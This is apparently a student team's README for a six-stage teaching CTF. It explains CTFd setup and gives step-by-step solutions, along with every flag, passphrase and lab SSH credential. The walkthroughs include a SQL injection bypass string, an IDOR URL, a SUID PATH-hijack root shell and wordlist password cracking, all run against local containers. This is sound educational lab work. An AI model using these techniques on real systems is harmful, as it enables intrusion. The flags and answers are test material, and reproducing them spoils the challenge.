# Operation Obsidian — 6-Stage CTF Play Box
**Module:** IE3132 – Penetration Testing and Defense (Assignment 02)  
**Institution:** Sri Lanka Institute of Information Technology (SLIIT)  

## Team Members & Responsibilities
| Member | Student ID | Full Name | Role & Stages |
| :--- | :--- | :--- | :--- |
| **Member 1** | IT24100105 | Gamage K.G.T.P. | CTF Platform & Architecture (CTFd, Docker, Stage 101) |
| **Member 2** | IT24102703 | Gunawardena D.H. | Challenge Design A (Stages 1, 2, 3) |
| **Member 3** | IT24102119 | Ashwin S. | Challenge Design B (Stages 4, 5, 6) |
| **Member 4** | IT24102620 | Shiamkumar J. | Integration, Testing & Documentation |

---

## 1. Architecture & Challenge Overview
**Operation Obsidian** is a linear, story-driven 6-stage (+1 onboarding stage) Capture The Flag environment simulating a full-spectrum takedown of an underground cybercriminal syndicate ("The Obsidian Market").

| Stage | Challenge Name | Category | Difficulty | Points | Flag |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **101** | Introduction to Obsidian | Introduction | Onboarding | 100 | `obsidian{op3r4t10n_0bs1d14n_1n1t14t3d}` |
| **1** | Whispers in the Shadows | Steganography | Easy | 50 | `obsidian{wh1sp3rs_1n_th3_sh4d0ws}` |
| **2** | The Broken Barrier | Web Application Exploitation (IDOR) | Easy | 100 | `obsidian{1d0r_byp4ss_4cc3ss_gr4nt3d}` |
| **3** | The Database Breach | Web Application Exploitation (SQLi) | Moderate | 100 | `obsidian{sqli_m4st3r_d4t4b4s3_pwn3d}` |
| **4** | Beyond the User | System Security / Privilege Escalation | Moderate | 150 | `obsidian{su1d_p4th_h1j4ck_r00t}` |
| **5** | Remnants of the Purge | Digital Forensics | Moderate–Hard | 200 | `obsidian{ph4nt0m_v0lum3_c4rv3d}` |
| **6** | The Hidden Logic | Reverse Engineering | Hard (Capstone) | 300 | `obsidian{x0r_c0r3_l0g1c_r3v3rs3d}` |

---

## 2. Prerequisites & System Requirements
- **Host OS:** Windows 10/11 (with Docker Desktop) or Linux (Ubuntu/Kali with Docker Engine & Docker Compose v2).
- **RAM & Storage:** Minimum 4 GB free RAM and 5 GB free disk space.
- **Attacker / Player Tools (Kali Linux / Windows):**
  * Web Browser, `steghide` / `stegseek` / `exiftool` / `strings` (Stage 1)
  * `ssh` client (Stage 4)
  * **Autopsy**, **John the Ripper** (`zip2john`), `unzip`, `base64` (Stage 5)
  * **Ghidra** / **Python 3** / **CyberChef** (Stage 6)

---

## 3. Environment Setup & Stage Walkthroughs

### 3.1 CTF Platform (CTFd)
The **Operation Obsidian** scoring platform is hosted using the official **CTFd** Docker image (Reference: [Docker Hub - ctfd/ctfd](https://hub.docker.com/r/ctfd/ctfd)).

```bash
# Pull the official CTFd image:
docker pull ctfd/ctfd

# Standalone execution on Port 5333 -> 8000:
docker run -d -p 5333:8000 --name ctfd ctfd/ctfd

# Or launch all containers via the project's Docker Compose file:
docker compose up -d
```

**Challenge Backup Import:**  
All 7 stages (Stage 101 through Stage 6), point values, hints, forfeit paths, downloadable challenge attachments, and custom JavaScript category-sorting rules are pre-packaged in the included backup archive: **`Project Obsidian.2026-10-11_15_12_41.zip`**.

1. Log in to the CTFd web interface (`http://localhost:5333`) using your **Admin** account.
2. Click **Admin Panel** in the top navigation bar.
3. Navigate to **Config** -> **Backup** (or **Import & Export**).
4. Click the **Import** tab.
5. Select the backup file **`Project Obsidian.2026-10-11_15_12_41.zip`** from the submission directory and click **Import**.
6. Once the import completes, refresh the **Challenges** page (`Ctrl + F5`) to verify that **Introduction** (`Stage 101: Introduction to Obsidian`) appears first, followed sequentially by Stages 1 to 6.

**Custom Category Ordering Function (CTFd Theme Config):**  
To guarantee sequential category ordering regardless of point values, the following comparator function is applied under **Admin Panel** -> **Config** -> **Theme** -> **Challenge Category Order Custom Function**:

```javascript
function (a, b) {
  const order = [
    "Introduction",
    "Steganography",
    "Web Application Exploitation",
    "System Security / Privilege Escalation",
    "Digital Forensics",
    "Reverse Engineering"
  ];
  const indexA = order.indexOf(a);
  const indexB = order.indexOf(b);
  if (indexA !== -1 && indexB !== -1) return indexA - indexB;
  if (indexA !== -1) return -1;
  if (indexB !== -1) return 1;
  return a.localeCompare(b);
}
```

---

### 3.2 Stage 01: Whispers in the Shadows (Steganography)
* **Artifact:** `intercepted.jpeg`
* **Steghide Passphrase:** `milo44`
* **Flag:** `obsidian{wh1sp3rs_1n_th3_sh4d0ws}`

```bash
// 1. Embed the secret flag file into the cover image (Builder Step)
steghide embed -cf intercepted.jpeg -ef flag1.txt -p milo44

// 2. Inspect image metadata and verify file type (Player Recon)
file intercepted.jpeg
exiftool intercepted.jpeg

// 3. Crack the steghide passphrase and extract the hidden payload using Stegseek
stegseek -sf intercepted.jpeg -wl /usr/share/wordlists/rockyou.txt

// 4. Alternative manual extraction (once passphrase "milo44" is known)
steghide extract -sf intercepted.jpeg -p milo44

// 5. Read the extracted flag file
cat intercepted.jpeg.out
```

---

### 3.3 Stage 02 & Stage 03: The Broken Barrier (IDOR) & The Database Breach (SQLi)
* **Container Name:** `web-1`
* **Stage 02 Flag:** `obsidian{1d0r_byp4ss_4cc3ss_gr4nt3d}`
* **Stage 03 Flag:** `obsidian{sqli_m4st3r_d4t4b4s3_pwn3d}`
* **Leaked SSH Credentials:** `sysadmin_01` / `Sup3rS3cr3tSSH!`

```bash
// 1. Build and start the web container
docker compose up -d

// 2. Stage 02 (IDOR) - Modify the user profile ID parameter in the URL to access Admin (ID=1)
http://localhost:80/profile.php?id=1

// 3. Stage 03 (SQLi) - Inject authentication bypass / UNION payload into the login gateway
' OR 1=1 -- -
```

---

### 3.4 Stage 04: Beyond the User (SUID & PATH Hijacking)
* **Container Name:** `obsidian_linux`
* **SSH Credentials (from Stage 03):** `sysadmin_01` / `Sup3rS3cr3tSSH!`
* **Flag:** `obsidian{su1d_p4th_h1j4ck_r00t}`

```bash
// 1. Connect to the target server via SSH
ssh sysadmin_01@localhost -p 22

// 2. Locate the vulnerable SUID binary
find / -perm -u=s -type f 2>/dev/null

// 3. Navigate to a world-writable directory
cd /tmp

// 4. Create the fake "cat" command to spawn a privileged bash shell
echo "/bin/bash -p" > cat

// 5. Make the fake "cat" binary executable
chmod +x cat

// 6. Hijack the $PATH variable so the system checks /tmp first
export PATH=/tmp:$PATH

// 7. Execute the vulnerable SUID binary (triggers our fake "cat")
/usr/local/bin/<VULN_BINARY_NAME>

// 8. Verify root privileges
whoami

// 9. Read the root flag (using the full path to the real "cat" binary)
/usr/bin/cat /root/flag4.txt
```

---

### 3.5 Stage 05: Remnants of the Purge (Digital Forensics)
* **Artifact:** `evidence_drive.dd`
* **Flag:** `obsidian{ph4nt0m_v0lum3_c4rv3d}`

```bash
// 1. Recover the deleted archive in Autopsy (GUI Steps)
- Open Autopsy -> New Case -> Add Data Source -> Disk Image or VM File
- Select "evidence_drive.dd"
- Navigate to: Data Sources -> evidence_drive.dd -> $OrphanFiles (or Views -> Deleted Files)
- Right-click "secret_backup.zip" -> Extract File(s)

// 2. Extract the password hash from the recovered ZIP file
zip2john secret_backup.zip > zip.hash

// 3. Crack the ZIP password using John the Ripper and rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash

// 4. View the cracked password
john --show zip.hash

// 5. Extract the password-protected ZIP file (enter cracked password when prompted)
unzip secret_backup.zip

// 6. View the obfuscated (Base64) contents inside flag.txt and decode it
cat flag.txt
cat flag.txt | base64 -d
```

---

### 3.6 Stage 06: The Hidden Logic (Reverse Engineering)
* **Artifact:** `obsidian_core.exe`
* **Passphrase (Decoded):** `r3v3rs3`
* **Flag:** `obsidian{x0r_c0r3_l0g1c_r3v3rs3d}`

```bash
// 1. Cross-compile the challenge binary on Kali (Builder Step)
x86_64-w64-mingw32-gcc obsidian_core.c -o obsidian_core.exe

// 2. Load the binary into Ghidra for static analysis (GUI Steps)
- Open Ghidra -> File -> Import File -> Select "obsidian_core.exe"
- Double-click "obsidian_core.exe" to open CodeBrowser and run default Auto-Analysis
- Navigate to: Symbol Tree -> Functions -> main -> check_pass
- Identify the 7-character check using bitwise XOR key 0x5A against "(i,i()i" (Hex: 28 69 2c 69 28 29 69)

// 3. Decode the passphrase using Python (or CyberChef)
python3 -c 'print("".join(chr(b ^ 0x5A) for b in [0x28, 0x69, 0x2c, 0x69, 0x28, 0x29, 0x69]))'
# Output: r3v3rs3

// 4. Run the binary in terminal and enter the passphrase to get the flag
.\obsidian_core.exe

```

---

## 4. GitHub Repository & Source Code
https://github.com/IT24102620/CTF

---

## 5. Acknowledgments & Third-Party Tools
* **CTFd** (https://ctfd.io/) – Open-source CTF scoring and hosting framework.
* **Docker & Docker Compose** – Containerization and network isolation.
* **Steghide & Stegseek** – Steganography embedding and passphrase recovery.
* **Autopsy & AccessData FTK Imager** – NTFS `.vhd` to raw `.dd` conversion and MFT orphan recovery.
* **John the Ripper (`zip2john`)** – PKZIP password hash extraction and dictionary cracking.
* **NSA Ghidra & MinGW-w64 (`x86_64-w64-mingw32-gcc`)** – Cross-compilation and static decompilation of `obsidian_core.exe`.
